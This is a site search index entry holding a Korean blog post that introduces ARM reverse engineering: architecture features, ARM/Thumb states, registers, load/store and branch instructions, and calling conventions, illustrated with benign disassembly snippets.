<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1. ARM 리버스 엔지니어링 기초</title>
    <url>/2022/07/02/arm-1-introduction/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<p>ARM 아키텍처의 특징과 인스트럭션을 이해하고, 기초적인 리버스 엔지니어링을 연습해 보겠습니다.</p>
<h2 id="arm-%EC%95%84%ED%82%A4%ED%85%8D%EC%B2%98-%EC%86%8C%EA%B0%9C" tabindex="-1">ARM 아키텍처 소개</h2>
<p>1980년대 후반 개발된 ARM 아키텍처는 휴대폰, 자동차, 텔레비전 등 다양한 임베디드 장치에서 사용되고 있습니다. ARM 아키텍처는 ARM 홀딩스가 디자인한 후 다른 회사들에 라이센스를 판매하며, 애플, 퀄컴과 같은 파트너사는 라이센스를 구매하여 자신들의 장치에 사용할 프로세서에 적용합니다. 이들 프로세서는 모두 ARM 레퍼런스 매뉴얼에 정의된 기본적인 인스트럭션 집합과 메모리 모델을 구현하고 있습니다.</p>
<p><img src="/images/arm-1-introduction/1.png" alt="1.png"></p>
<h2 id="arm-%EC%95%84%ED%82%A4%ED%85%8D%EC%B2%98%EC%9D%98-%ED%8A%B9%EC%A7%95" tabindex="-1">ARM 아키텍처의 특징</h2>
<p>ARM은 RISC 아키텍처로, CISC 아키텍처인 x86/x64와는 몇 가지 다른 점이 있습니다.</p>
<ol>
<li>ARM 인스트럭션 집합은 x86/64에 비해 작지만, 범용 레지스터의 수는 더 많습니다.</li>
<li>인스트럭션의 길이가 고정되어 있습니다.</li>
<li>메모리 접근에 load-store 모델을 사용합니다.
<ul>
<li>데이터를 연산하기 전 반드시 메모리에서 레지스터로 옮겨야 하며, 오직 load와 store 인스트럭션만 메모리에 접근할 수 있습니다.</li>
</ul>
</li>
</ol>
<p>ARM은 여러 가지의 서로 다른 특권 수준(privileged modes)을 제공하는데, 일단은 편의를 위해 User를 x86/64에서의 Ring 3, Supervisor를 Ring 0로 생각해도 좋습니다.</p>
<p><img src="/images/arm-1-introduction/2.jpg" alt="2.jpg"></p>
<p>ARM 프로세서는 두 가지 상태(state), ARM과 Thumb으로 동작할 수 있습니다. 이 때 상태는 사용할 인스트럭션 집합과 관련이 있으며, 특권 수준과는 무관합니다. ARM 상태에서 인스트럭션의 길이는 항상 32비트이며, Thumb 상태에서는 16비트 또는 32비트입니다.</p>
<p>프로세서의 상태는 다음과 같이 결정됩니다.</p>
<ol>
<li><code>BX</code> 또는 <code>BLX</code> 인스트럭션으로 분기할 때, 목적지 레지스터의 최하위 비트(LSB)가 1이면 Thumb 상태로 전환합니다.</li>
<li>현재 <code>CPSR</code> 레지스터의 <code>T</code> 비트가 1이면 Thumb 상태입니다.</li>
</ol>
<p>대부분의 ARM과 Thumb 인스트럭션은 동일한 니모닉(mnemonic)을 갖고 있지만, Thumb 인스트럭션 중 길이가 32비트인 것은 <code>.w</code> 접미사가 붙습니다.</p>
<p>ARM은 또한 조건부 실행(conditional execution)을 지원합니다. 이는 인스트럭션에 특정한 조건이 함께 인코딩되어 있고, 이 조건을 만족하는 경우에만 실행됨을 의미합니다. 조건부 실행을 사용하면 분기문에 필요한 인스트럭션의 개수를 줄일 수 있어 유용합니다. ARM 상태에서 모든 인스트럭션은 조건부 실행이 가능하지만, 조건의 기본값은 ‘항상 실행함(<code>AL</code>)’ 입니다. Thumb 상태에서는 특별한 인스트럭션 <code>IT</code> 를 사용해야만 조건부 실행이 가능합니다.</p>
<p>또 다른 ARM의 독특한 기능은 배럴 시프터(barrel shifter)로, 특정한 인스트럭션은 값을 시프트하거나 회전(rotate)시키는 다른 연산을 포함할 수 있습니다. (e.g. <code>MOV R1, R0, LSL #1</code> 은 <code>R0</code> 레지스터를 왼쪽으로 1비트 시프트한 후 <code>R1</code> 레지스터에 대입합니다) 배럴 시프터는 조건부 실행과 마찬가지로 인스트럭션의 개수를 줄이는 데 도움이 됩니다.</p>
<h2 id="%EB%B2%94%EC%9A%A9-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0" tabindex="-1">범용 레지스터</h2>
<p>ARM 아키텍처는 16개의 32비트 범용 레지스터 <code>R0</code> , <code>R1</code> , … , <code>R15</code> 를 제공합니다. 모든 범용 레지스터는 개발자가 자유롭게 사용할 수 있지만, 실제로는 앞의 12개 레지스터만 범용으로 쓰이고 나머지는 특수 레지스터처럼 사용됩니다.</p>
<ul>
<li><code>R13</code> 은 스택 포인터(<code>SP</code>)를 나타냅니다.</li>
<li><code>R14</code> 는 링크 레지스터(<code>LR</code>)를 나타냅니다.
<ul>
<li>링크 레지스터(link register)는 함수의 리턴 주소를 보관하는 레지스터로, 일부 인스트럭션에 의해 사용됩니다. (e.g. <code>BL</code> 인스트럭션은 함수를 호출하기 전 항상 <code>LR</code> 에 리턴 주소를 저장합니다)</li>
</ul>
</li>
<li><code>R15</code> 는 프로그램 카운터(<code>PC</code>)를 나타냅니다.
<ul>
<li>ARM 상태에서 <code>PC</code> 는 x86/64와는 다르게, 현재 인스트럭션 주소에 8을 더한 값입니다. (ARM 인스트럭션 2개 뒤의 주소)</li>
<li>Thumb 상태에서 <code>PC</code> 는 현재 인스트럭션 주소에 4를 더한 값입니다. (Thumb 인스트럭션 2개 뒤의 주소)</li>
<li><code>PC</code> 레지스터에 주소를 대입할 수 있으며, 대입 즉시 그 주소부터 다음 인스트럭션이 실행됩니다.</li>
<li><code>gdb</code> 디버거에서는 <code>PC</code> 레지스터의 값으로 현재 인스트럭션의 주소를 보여주는데, 이는 편의상 <code>PC</code> 가 alias되어있기 때문에 그런 것으로 실제와는 차이가 있음에 유의합니다.</li>
</ul>
</li>
</ul>
<p>ARM은 현재 프로세서와 실행 흐름의 상태를 <code>CPSR</code> 레지스터에 보관합니다. (<code>APSR</code> 레지스터라고도 합니다) <code>CPSR</code> 레지스터에는 다음을 포함한 다양한 플래그들이 있습니다.</p>
<ul>
<li><code>E</code> (엔디언 비트) - ARM은 빅 엔디언 모드와 리틀 엔디언 모드 모두에서 동작할 수 있습니다.
<ul>
<li>리틀 엔디언은 0, 빅 엔디언은 1이며 대부분의 경우 리틀 엔디언입니다.</li>
</ul>
</li>
<li><code>T</code> (Thumb 비트) - Thumb 상태인 경우 1입니다.</li>
<li><code>M</code> (Mode 필드) - 현재 특권 수준(e.g. User, Supervisor)을 의미합니다.</li>
</ul>
<p><img src="/images/arm-1-introduction/3.png" alt="3.png"></p>
<h2 id="%EB%B3%B4%EC%A1%B0-%ED%94%84%EB%A1%9C%EC%84%B8%EC%84%9C%EC%99%80-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EC%84%A4%EC%A0%95" tabindex="-1">보조 프로세서와 시스템 설정</h2>
<p>ARM 아키텍처는 확장 인스트럭션과 시스템 설정을 위해 사용되는 보조 프로세서(coprocessors)를 제공합니다. (e.g. x86/64에서는 시스템 설정을 <code>CR0</code> , <code>CR4</code> 레지스터에, ARM에서는 <code>CP15</code> 레지스터에 보관합니다) 보조 프로세서는 <code>CP0</code> , <code>CP1</code> , … , <code>CP15</code> 의 16개가 존재합니다. (코드에서는 <code>P0</code> , … , <code>P15</code> 로 사용됩니다) <code>CP14</code> 와 <code>CP15</code> 는 디버깅과 시스템 설정을 위해 사용되고, 나머지는 제조사가 특정한 인스트럭션을(e.g. 부동소수점 연산) 구현하기 위해 선택적으로 사용할 수 있습니다.</p>
<p>각각의 보조 프로세서는 16개의 레지스터와 8개의 opcode를 가지고 있으며, opcode의 시맨틱(semantic)은 프로세서마다 다릅니다. 보조 프로세서에 대한 접근은 오직 <code>MRC</code> , <code>MCR</code> 인스트럭션을 사용한 읽기와 쓰기만 가능합니다. (e.g. <code>MRC P15, 0, R0, C2, C0, 0</code> 은 보조 프로세서 <code>CP15</code> 의 <code>C2</code> / <code>C0</code> 레지스터를 opcode <code>0</code> / <code>0</code> 으로 읽어 범용 레지스터 <code>R0</code> 에 대입합니다) <code>MRC</code> 와 <code>MCR</code> 인스트럭션 자체는 높은 특권 수준을 요구하지 않지만, 일부 보조 프로세서의 레지스터와 opcode들은 오로지 Supervisor 수준에서만 접근이 가능합니다. 이들 레지스터를 User 수준에서 읽으려 하면 익셉션이 발생할 것입니다.</p>
<h2 id="%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98-%EC%A7%91%ED%95%A9%EC%9D%98-%ED%8A%B9%EC%A7%95" tabindex="-1">인스트럭션 집합의 특징</h2>
<p>조건부 실행이나 배럴 시프터 외에도, ARM 인스트럭션에는 x86에 없는 특징들이 있습니다.</p>
<ol>
<li>일부 인스트럭션은 레지스터의 범위를 인자로 받을 수 있습니다.
<ul>
<li>e.g. <code>STM R1, &#123;R6-R10&#125;</code> 은 레지스터 <code>R1</code> 이 가리키는 주소에 <code>R6</code> , <code>R7</code> , … , <code>R10</code> 의 5개 값을 순서대로 씁니다.</li>
<li>연속하지 않는 레지스터들도 쉼표를 사용해서(e.g. <code>&#123;R1,R5,R8&#125;</code>) 인자로 전달할 수 있습니다.</li>
</ul>
</li>
<li>일부 인스트럭션은 읽기, 쓰기 이후 선택적으로 베이스 레지스터의 값을 갱신할 수 있습니다.
<ul>
<li>e.g. <code>STM SP!, &#123;R6-R10&#125;</code> 을 실행하면 <code>SP</code> 의 값은 <code>R10</code> 의 값이 쓰인 주소의 4바이트 뒤로 갱신됩니다.</li>
</ul>
</li>
</ol>
<h2 id="load%EC%99%80-store-%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98" tabindex="-1">Load와 Store 인스트럭션</h2>
<h3 id="ldr-%EA%B3%BC-str" tabindex="-1"><code>LDR</code> 과 <code>STR</code></h3>
<p><code>LDR</code> 과 <code>STR</code> 인스트럭션은 메모리에서 1바이트, 2바이트 또는 4바이트를 읽고 씁니다. 인스트럭션의 문법은 살짝 복잡한데, 오프셋을 지정하거나 베이스 레지스터를 갱신하는 여러 가지 방법이 존재하기 때문입니다. 가장 단순한 경우는 다음과 같습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn]        <span class="comment">; Rt = *Rn</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn]        <span class="comment">; *Rn = Rt</span></span><br></pre></td></tr></table></figure>
<p><code>LDR</code> , <code>STR</code> 인스트럭션은 베이스 레지스터와 오프셋을 인자로 받는데, 오프셋의 형태가 3가지 있고 베이스 레지스터를 갱신하는 방법이 3가지 있습니다. 먼저 3가지의 오프셋 형태를 살펴보겠습니다.</p>
<ol>
<li>상수가 오프셋인 경우
<ul>
<li>상수 값(immediate)은 단순히 정수로, 특정 오프셋의 데이터에 접근하기 위해 베이스 레지스터에 더하거나 빼는 경우입니다. (e.g. 구조체, vtable의 특정 필드 접근)</li>
</ul>
</li>
</ol>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, imm]   <span class="comment">; Rt = *(Rn + imm)</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn, imm]   <span class="comment">; *(Rn + imm) = Rt</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>레지스터가 오프셋인 경우
<ul>
<li>보통 배열에 접근하는데, 인덱스가 런타임에 계산되는 경우입니다.</li>
</ul>
</li>
</ol>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, Rm]    <span class="comment">; Rt = *(Rn + Rm)</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn, Rm]    <span class="comment">; *(Rn + Rm) = Rt</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>레지스터의 정수배가 오프셋인 경우
<ul>
<li>보통 반복문 안에서 배열을 순회하면서, 원소의 크기 단위로 포인터를 증가시키는 경우입니다.</li>
</ul>
</li>
</ol>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, Rm, shift]     <span class="comment">; Rt = *(Rn + Rm * shift)</span></span><br><span class="line"><span class="keyword">STR</span> Rt, [Rn, Rm, shift]     <span class="comment">; *(Rn + Rm * shift) = Rt</span></span><br></pre></td></tr></table></figure>
<p>다음으로 베이스 레지스터를 갱신하는 3가지 방법입니다.</p>
<ol>
<li>오프셋 방식
<ul>
<li>가장 단순하고 흔한 방식으로, 베이스 레지스터는 절대 갱신되지 않습니다.</li>
<li>느낌표(<code>!</code>)가 없고 상수가 대괄호 안에 있으면 오프셋 방식입니다.</li>
</ul>
</li>
</ol>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, offset]        <span class="comment">; Rt = *(Rn + offset)</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>pre-indexed 방식
<ul>
<li>베이스 레지스터를 먼저 갱신한 후 참조합니다. (C언어의 전위 연산자와 유사)</li>
</ul>
</li>
</ol>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, offset]!       <span class="comment">; Rt = *(Rn + offset)</span></span><br><span class="line">                            <span class="comment">; Rn = Rn + offset</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>post-indexed 방식
<ul>
<li>베이스 레지스터를 먼저 참조한 후 갱신합니다. (C언어의 후위 연산자와 유사)</li>
</ul>
</li>
</ol>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn], offset]       <span class="comment">; Rt = *Rn</span></span><br><span class="line">                            <span class="comment">; Rn = Rn + offset</span></span><br></pre></td></tr></table></figure>
<h3 id="ldr-%EA%B3%BC-pseudo-%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98" tabindex="-1"><code>LDR</code> 과 pseudo 인스트럭션</h3>
<p>일부 디스어셈블 결과에서 다음과 같이 <code>LDR</code> 을 사용하는 방식을 볼 수도 있습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">LDR.W</span> <span class="built_in">R8</span>, <span class="number">=0x2932E00</span>        <span class="comment">; LDR R8, [PC, x]</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R2</span>, <span class="symbol">=a04d</span> <span class="comment">; &quot;%04d&quot;      ; LDR R2, [PC, y]</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, <span class="symbol">=__imp_realloc</span>      <span class="comment">; LDR R3, [PC, z]</span></span><br></pre></td></tr></table></figure>
<p>이 방식은 사실 pseudo 인스트럭션으로, 디스어셈블러들이 편의상 위와 같이 나타내는 것입니다. 실제로는 <code>PC</code> 를 베이스 레지스터로, 상수를 오프셋으로 하는 PC-relative 방식의 <code>LDR</code> 인스트럭션입니다.</p>
<p>다른 pseudo 인스트럭션으로 레이블이나 함수의 주소를 레지스터에 대입하는 <code>ADR</code> 인스트럭션이 있습니다. 보통 점프 테이블이나 콜백 구현에 사용되는데, 마찬가지로 내부적으로는 PC-relative 방식의 <code>LDR</code> 인스트럭션입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADR</span> <span class="built_in">R5</span>, dword_9528</span><br><span class="line"><span class="symbol">LDRD.W</span> <span class="built_in">R4</span>, <span class="built_in">R5</span>, [<span class="built_in">R5</span>]</span><br></pre></td></tr></table></figure>
<h3 id="ldm-%EA%B3%BC-stm" tabindex="-1"><code>LDM</code> 과 <code>STM</code></h3>
<p><code>LDM</code> 과 <code>STM</code> 은 베이스 레지스터가 가리키는 주소에서 여러 개의 값을 한번에 읽고 씁니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">LDM</span>&lt;mode&gt; Rn[!], &#123;Rm&#125;</span><br><span class="line"><span class="symbol">STM</span>&lt;mode&gt; Rn[!], &#123;Rm&#125;</span><br></pre></td></tr></table></figure>
<p><code>Rn</code> 은 베이스 레지스터로, 값을 읽고 쓸 메모리 주소를 가리킵니다. 느낌표(<code>!</code>)는 선택인데, 느낌표가 있으면 베이스 레지스터를 실행 후 갱신함을(writeback) 의미합니다. <code>Rm</code> 은 레지스터들의 범위이며, <code>mode</code> 는 다음과 같이 4가지가 존재합니다.</p>
<ol>
<li><code>IA</code> (increment after) - <code>베이스 주소</code> 부터 값을 읽고 쓰며, writeback은 <code>마지막으로 읽고 쓴 주소 + 4</code> 입니다.
<ul>
<li>명시된 <code>mode</code> 가 없는 경우 기본값입니다.</li>
</ul>
</li>
<li><code>IB</code> (increment before) - <code>베이스 주소 + 4</code> 부터 값을 읽고 쓰며, writeback은 <code>마지막으로 읽고 쓴 주소</code> 입니다.</li>
<li><code>DA</code> (decrement after) - <code>베이스 주소</code> 부터 낮은 방향으로(거꾸로) 값을 읽고 쓰며, writeback은 <code>마지막으로 읽고 쓴 주소 - 4</code> 입니다.</li>
<li><code>DB</code> (decrement before) - <code>베이스 주소 - 4</code> 부터 낮은 방향으로(거꾸로) 값을 읽고 쓰며, writeback은 <code>마지막으로 읽고 쓴 주소</code> 입니다.</li>
</ol>
<p>예를 들어, 다음은 <code>IA</code> 모드와 writeback을 사용하여 여러 값을 읽고 쓰는 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> <span class="built_in">R6</span>, <span class="symbol">=mem</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="number">#10</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R1</span>, <span class="number">#11</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R2</span>, <span class="number">#12</span></span><br><span class="line"><span class="keyword">LDM</span> <span class="built_in">R6</span>!, &#123;<span class="built_in">R3</span>,<span class="built_in">R4</span>,<span class="built_in">R5</span>&#125;</span><br><span class="line"><span class="keyword">STMIA</span> <span class="built_in">R6</span>!, &#123;<span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span>&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/arm-1-introduction/4.png" alt="4.png"></p>
<p><code>LDM</code> 과 <code>STM</code> 은 한번에 여러 값을 옮길 수 있어, 보통 블록 단위의 복사 등에 사용됩니다. (e.g. 복사할 길이를 컴파일 시점에 알고 있을 경우, <code>memcpy</code> 대신 사용할 수 있습니다) 또한 ARM 상태에서 함수의 시작과 끝에서도 사용되는데, 함수 프롤로그와 에필로그의 역할을 합니다.</p>
<ul>
<li><code>STMFD</code> 와 <code>LDMFD</code> 는 각각 <code>STMDB</code> , <code>LDMIA</code> 의 pseudo 인스트럭션입니다.</li>
</ul>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">STMFD</span> <span class="built_in">SP</span>!, &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;      <span class="comment">; 레지스터와 리턴 주소를 스택에 보관합니다.</span></span><br><span class="line"><span class="keyword">LDMFD</span> <span class="built_in">SP</span>!, &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;      <span class="comment">; 레지스터와 리턴 주소를 꺼내고 반환합니다.</span></span><br></pre></td></tr></table></figure>
<h2 id="push-%EC%99%80-pop" tabindex="-1"><code>PUSH</code> 와 <code>POP</code></h2>
<p><code>PUSH</code> 와 <code>POP</code> 은 <code>LDM</code> , <code>STM</code> 과 비슷하지만, 두 가지 다른 특징이 있습니다.</p>
<ul>
<li><code>PUSH</code> 와 <code>POP</code> 은 <code>SP</code> 를 베이스 주소로 사용합니다.</li>
<li>실행 후 <code>SP</code> 가 자동으로 갱신됩니다.</li>
</ul>
<p>ARM 아키텍처에서도 스택은 x86/64와 마찬가지로 낮은 방향으로 자랍니다. 문법은 다음과 같으며, <code>&#123;Rn&#125;</code> 에는 레지스터들의 범위를 전달해야 합니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> &#123;Rn&#125;</span><br><span class="line"><span class="keyword">POP</span> &#123;Rn&#125;</span><br></pre></td></tr></table></figure>
<p>예를 들어, 다음은 <code>PUSH</code> 와 <code>POP</code> 을 이용해 스택에서 값을 읽고 쓰는 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">MOV.W</span> <span class="built_in">R0</span>, <span class="number">#10</span></span><br><span class="line"><span class="symbol">MOV.W</span> <span class="built_in">R1</span>, <span class="number">#11</span></span><br><span class="line"><span class="symbol">MOV.W</span> <span class="built_in">R2</span>, <span class="number">#12</span></span><br><span class="line"><span class="keyword">PUSH</span> &#123;<span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span>&#125;</span><br><span class="line"><span class="keyword">POP</span> &#123;<span class="built_in">R3</span>,<span class="built_in">R4</span>,<span class="built_in">R5</span>&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/arm-1-introduction/5.png" alt="5.png"></p>
<p><code>PUSH</code> 와 <code>POP</code> 은 흔히 Thumb 상태에서 함수의 프롤로그와 에필로그로 사용됩니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">PUSH.W</span> &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;          <span class="comment">; 레지스터와 리턴 주소를 스택에 보관합니다.</span></span><br><span class="line"><span class="symbol">POP.W</span> &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;           <span class="comment">; 레지스터와 리턴 주소를 꺼내고 반환합니다.</span></span><br></pre></td></tr></table></figure>
<h2 id="%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C%EA%B3%BC-%EB%B6%84%EA%B8%B0" tabindex="-1">함수 호출과 분기</h2>
<p>ARM 아키텍처는 목적지 주소를 인코딩한 방식에 따라 함수 호출과 분기를 위한 다양한 인스트럭션을 제공하고 있습니다. 함수 호출의 리턴의 원리는 x86/64와 기본적으로 같지만, 몇 가지 사소한 차이점들이 있습니다.</p>
<ol>
<li>리턴 주소를 스택이나 링크 레지스터(<code>LR</code>)에 저장할 수 있습니다.
<ul>
<li>함수 에필로그에서 리턴 시 <code>POP &#123;PC&#125;</code> 와 같이 스랙에서 리턴 주소를 직접 꺼내 <code>PC</code> 에 대입하거나, <code>BX LR</code> 과 같이 링크 레지스터로 분기할 수 있습니다.</li>
</ul>
</li>
<li>분기할 때 목적지 주소의 최하위 비트(LSB)에 따라 ARM 상태와 Thumb 상태를 오갈 수 있습니다.</li>
<li>함수 호출 규약의 차이가 있습니다.
<ul>
<li>4개 매개변수까지 레지스터 <code>R0</code> , <code>R1</code> , <code>R2</code> , <code>R3</code> 을 통해 전달하며, 나머지는 스택을 통해 전달합니다.</li>
<li>리턴 값은 <code>R0</code> 에 보관합니다.</li>
</ul>
</li>
</ol>
<p>함수 호출과 분기에 사용되는 인스트럭션은 <code>B</code> , <code>BX</code> , <code>BL</code> 과 <code>BLX</code> 가 있습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">B</span> label</span><br><span class="line"><span class="keyword">BL</span> label</span><br></pre></td></tr></table></figure>
<p><code>B</code> 는 단순한 분기로, x86/64에서의 <code>JMP</code> 와 동일합니다. 함수 호출에는 거의 사용되지 않지만, 리턴하지 않는 함수를 호출하기 위해 사용될 수 있습니다. 주로 반복문이나 조건문에서 코드 블록의 시작으로 돌아가거나 탈출하기 위해 사용됩니다. <code>BL</code> 은 branch with link로, 분기 전 <code>LR</code> 에 다음 인스트럭션의 주소를 저장합니다. x86/64에서의 <code>CALL</code> 과 비슷한 인스트럭션입니다. <code>B</code> 와 <code>BL</code> 은 모두 레이블의 오프셋만 인자로 받을 수 있습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BX</span> Rm</span><br></pre></td></tr></table></figure>
<p><code>BX</code> 는 branch and exchange로, <code>B</code> 와 비슷하지만 목적지 주소가 레지스터로 전달되고 ARM과 Thumb 상태를 오갈 수 있습니다. (목적지 주소의 최하위 비트가 1이면 Thumb 상태가 됩니다) 흔히 함수 에필로그에서 리턴을 위해 사용되거나, (i.e. <code>BX LR</code>) 다른 상태의 코드로 분기할 때 사용됩니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BLX</span> label</span><br><span class="line"><span class="keyword">BLX</span> Rm</span><br></pre></td></tr></table></figure>
<p><code>BLX</code> 는 branch with link and exchange로, <code>BL</code> 과 비슷하지만 ARM과 Thumb 상태를 전환할 수 있으며 인자로 레지스터에 보관된 목적지 주소나 레이블의 오프셋 모두를 전달할 수 있습니다. (<code>BLX</code> 가 레이블의 오프셋을 인자로 받는 경우는 반드시 상태를 전환하기 위함입니다) <code>BL</code>과 <code>BLX</code> 는 모두 함수 호출에 사용되는데, <code>BL</code> 는 현재 인스트럭션으로부터 32MB 범위 안에 있는 함수 호출에 사용하며 <code>BLX</code> 는 함수의 주소가 정해지지 않은 (e.g. 함수 포인터) 경우 사용합니다. Thumb 상태에서 <code>BLX</code> 는 주로 라이브러리 함수 호출에 사용되며, ARM 상태에서는 <code>BL</code> 을 대신 사용합니다.</p>
<p>다음 예제는 어떤 함수를 디스어셈블한 결과인데, 함수 호출과 분기를 위한 인스트럭션이 어떻게 사용되고 있는지 살펴보겠습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">PUSH.W</span> &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">ADDW</span> <span class="built_in">R11</span>, <span class="built_in">SP</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, <span class="symbol">=__imp_malloc</span></span><br><span class="line"><span class="keyword">ADDS</span> <span class="built_in">R5</span>, <span class="built_in">R0</span>, <span class="number">#7</span></span><br><span class="line"><span class="symbol">BFC.W</span> <span class="built_in">R5</span>, <span class="number">#0</span>, <span class="number">#3</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">ADDS.W</span> <span class="built_in">R0</span>, <span class="built_in">R5</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">BLX</span> <span class="built_in">R3</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R4</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="keyword">CBZ</span> <span class="built_in">R4</span>, loc_100C3AE</span><br><span class="line"><span class="keyword">ASRS</span> <span class="built_in">R3</span>, <span class="built_in">R5</span>, <span class="number">#0x1F</span></span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R3</span>, [<span class="built_in">R4</span>,<span class="number">#4</span>]</span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R5</span>, [<span class="built_in">R4</span>]</span><br><span class="line"><span class="keyword">B</span> loc_100C3B8</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_100C3AE:</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R1</span>, <span class="symbol">=aFailed</span> <span class="comment">; &quot;failed...&quot;</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R2</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R0</span>, <span class="number">#7</span></span><br><span class="line"><span class="keyword">BL</span> foo</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_100C3B8:</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R4</span></span><br><span class="line"><span class="symbol">POP.W</span> &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>1행의 <code>PUSH.W &#123;R4,R5,R11,LR&#125;</code> 은 함수 프롤로그, 24행의 <code>POP.W &#123;R4,R5,R11,PC&#125;</code> 는 함수 에필로그에 해당합니다.</li>
<li>8행에서 <code>BLX</code> 를 이용해 <code>malloc</code> 라이브러리 함수를 호출하고 있습니다.</li>
<li>20행에서 <code>BL</code> 을 이용해 <code>foo</code> 함수를 호출하고 있습니다.</li>
</ul>
<h2 id="%EC%82%B0%EC%88%A0-%EC%97%B0%EC%82%B0" tabindex="-1">산술 연산</h2>
<p><code>MOV</code> 인스트럭션은 값을 대입하는 가장 단순한 인스트럭션입니다. 대입하는 값은 상수거나 레지스터의 값, 또는 레지스터의 값에 배럴 시프터를 사용한 값입니다. 배럴 시프터로는 값에 대한 왼쪽 시프트(<code>LSL</code>), 오른쪽 시프트(<code>LSR</code>, <code>ASR</code>), 회전(<code>ROR</code>, <code>RRX</code>)이 가능합니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="number">#0xa</span>            <span class="comment">; R0 = 0xa</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R7</span>              <span class="comment">; R0 = R7</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R4</span>, <span class="built_in">R4</span>, <span class="keyword">LSR</span> <span class="number">#21</span>     <span class="comment">; R4 = (R4 &gt;&gt; 21)</span></span><br></pre></td></tr></table></figure>
